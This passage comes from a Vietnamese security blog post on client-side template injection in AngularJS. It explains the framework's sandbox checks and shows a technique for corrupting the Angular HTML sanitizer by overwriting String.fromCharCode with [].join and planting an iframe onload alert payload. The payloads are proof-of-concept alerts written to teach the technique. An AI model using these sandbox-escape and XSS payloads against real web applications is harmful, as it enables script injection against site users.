class="keyword">if</span> (v2 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title function_">ensureSafeFunction</span>(v2, text);</span><br><span class="line">        v5 = <span class="string">&#x27;alert\u00281\u0029&#x27;</span>;</span><br><span class="line">        <span class="title function_">ensureSafeObject</span>(v3, text);</span><br><span class="line">        v1 = <span class="title function_">ensureSafeObject</span>(v3.<span class="title function_">constructor</span>(<span class="params">ensureSafeObject(<span class="string">&#x27;alert\u00281\u0029&#x27;</span>, text)</span>), text);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        v1 = <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (v1 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title function_">ensureSafeFunction</span>(v1, text);</span><br><span class="line">        v0 = <span class="title function_">ensureSafeObject</span>(<span class="title function_">v1</span>(), text);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        v0 = <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v0;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">return</span> fn;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/04/14/client-side-template-injection-with-angularjs/image4.png" class="">
+
+<p><code>ensureSafeObject(obj)</code>: Đây là trạm kiểm soát danh tính. Nó sẽ chặn ngay lập tức nếu bạn định truy cập vào:</p>
+<ul>
+<li><p>Window: Để bạn không thể gọi window.location hay các biến toàn cục.</p>
+</li>
+<li><p>Document: Ngăn chặn thao tác trực tiếp trên DOM.</p>
+</li>
+<li><p>Object&#x2F;Function Constructor: Ngăn bạn tạo ra các hàm mới thực thi lệnh hệ thống.</p>
+</li>
+</ul>
+<p><code>ensureSafeMemberName(name)</code>: Trạm kiểm soát tên gọi. Nó ngăn bạn sử dụng các thuộc tính nhạy cảm như <strong>proto</strong>, <strong>defineGetter</strong>… để can thiệp vào lõi của JavaScript.</p>
+<p><code>ensureSafeFunction(fn)</code>: Trạm kiểm soát hành động. Nó đảm bảo các hàm bạn gọi không phải là call, apply, bind hoặc chính cái Function constructor nguy hiểm.</p>
+<p><strong>Corrupting the sanitizer</strong></p>
+<p>Angular Sanitizer là một bộ lọc phía client. Khi dùng <code>ng-bind-html</code>, nó sẽ:</p>
+<ul>
+<li>Nhận chuỗi HTML đầu vào.</li>
+<li>Dựng nó lên một DOM tree ẩn.</li>
+<li>Quét qua các thẻ và thuộc tính dựa trên một “Whitelist” (danh sách trắng).</li>
+<li>Loại bỏ những gì được cho là nguy hiểm (như <code>onerror</code>, <code>onload</code>).</li>
+</ul>
+<p>Khó khăn: Trong môi trường AngularJS, bạn không thể khai báo một function statement hay function expression. Vậy làm sao để ghi đè một hàm có sẵn bằng mã độc của mình?</p>
+<p>Nếu không thể tạo hàm mới, tại sao không lấy một hàm có sẵn của JavaScript và gán nó cho một hàm khác?</p>
+<p>Mục tiêu được chọn là: <code>String.fromCharCode</code>.<br>Hàm này thường được các bộ lọc sử dụng để chuyển đổi các mã số thành ký tự (ví dụ: 65 thành ‘A’). Nếu chúng ta khiến hàm này luôn trả về một đoạn mã độc thay vì ký tự bình thường, chúng ta đã cài được backdoor thành công.</p>
+<p>Kẻ tấn công sử dụng hàm [].join để thay thế cho fromCharCode.</p>
+<p>Tại sao join lại hoạt động được trên String constructor?</p>
+<p>Hàm join của Array rất “dễ dãi”: Nó không quan tâm “this” có phải là mảng thật hay không. Nó chỉ cần đối tượng đó có thuộc tính .length và các chỉ số <code>0, 1, 2....</code></p>
+<p>String constructor là một hàm: Trong JavaScript, mọi hàm đều có thuộc tính <code>.length</code> (đại diện cho số lượng tham số đầu vào). Với String, length mặc định là <code>1</code>.</p>
+<p>Biến String thành mảng: Khi ta gán <code>String[0] = &#39;&lt;payload&gt;&#39;</code>, lúc này đối tượng String trông không khác gì một mảng có 1 phần tử đối với hàm join</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property">fromCharCode</span>=[].<span class="property">join</span>;   <span class="comment">// String.fromCharCode = Array.prototype.join</span></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>[<span class="number">0</span>]=<span class="string">&#x27;\u003ciframe onload=alert(/Backdoored/)\u003e&#x27;</span>; </span><br></pre></td></tr></table></figure>
+
+<img src="/2026/04/14/client-side-template-injection-with-angularjs/image5.png" class="">
+
+<h2 id="Tai-lieu-tham-khao"><a href="#Tai-lieu-tham-khao" class="headerlink" title="Tài liệu tham khảo"></a>Tài liệu tham khảo</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/angular-js/difference-between-angular-and-angularjs/">https://www.geeksforgeeks.org/angular-js/difference-between-angular-and-angularjs/</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a href="/story/">Story</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AngularJS"><span class="toc-number">1.</span> <span class="toc-text">AngularJS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS-la-gi"><span class="toc-number">1.1.</span> <span class="toc-text">AngularJS là gì</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mot-so-tinh-nang-cua-AngularJS"><span class="toc-number">1.2.</span> <span class="toc-text">Một số tính năng của AngularJS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS-vs-Angular"><span class="toc-number">1.3.</span> <span class="toc-text">AngularJS vs Angular</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-without-HTML-Client-Side-Template-Injection-with-AngularJS"><span class="toc-number">2.</span> <span class="toc-text">XSS without HTML: Client-Side Template Injection with AngularJS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gioi-thieu"><span class="toc-number">2.1.</span> <span class="toc-text">Giới thiệu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sandbox"><span class="toc-number">2.2.</span> <span class="toc-text">Sandbox</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tai-lieu-tham-khao"><span class="toc-number">3.</span> <span class="toc-text">Tài liệu tham khảo</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&text=Client Side Template Injection with AngularJS"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&is_video=false&description=Client Side Template Injection with AngularJS"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Client Side Template Injection with AngularJS&body=Check out this article: https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&name=Client Side Template Injection with AngularJS&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&t=Client Side Template Injection with AngularJS"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Duong Quang Hao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
